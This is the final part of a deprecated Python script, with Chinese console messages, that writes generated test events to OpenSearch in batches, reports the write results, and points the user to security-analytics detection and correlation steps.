        print(f"  Events数量较多（{len(all_events)}），使用分批写入...")
        from app.services.opensearch.scripts.optimize_bulk_write import store_events_optimized
        result = store_events_optimized(all_events, batch_size=300, refresh_after=True)
    else:
        result = store_events(all_events)
    
    print("\n" + "=" * 80)
    print("完成")
    print("=" * 80)
    print(f"  总数: {result.get('total', 0)}")
    print(f"  成功: {result.get('success', 0)}")
    print(f"  失败: {result.get('failed', 0)}")
    print(f"  重复: {result.get('duplicated', 0)}")
    print(f"  丢弃: {result.get('dropped', 0)}")
    
    if result.get('success', 0) >= args.count:
        print(f"\n[OK] 成功生成至少 {args.count} 个events")
    else:
        print(f"\n[WARNING] 实际生成 {result.get('success', 0)} 个events（目标: {args.count}）")
    
    print("\n[INFO] 现在可以运行 Security Analytics 检测来生成findings")
    print("[INFO] 然后运行 correlation analysis 来查看correlations")


if __name__ == "__main__":
    import warnings
    warnings.warn(
        "generate_test_events.py已弃用，请使用 consolidated_data_generator.py",
        DeprecationWarning,
        stacklevel=2
    )
    print("\n[WARNING] 此脚本已弃用")
    print("[INFO] 请使用: uv run python consolidated_data_generator.py")
    print("[INFO] 或者直接运行此脚本（功能已保留）\n")
    main()
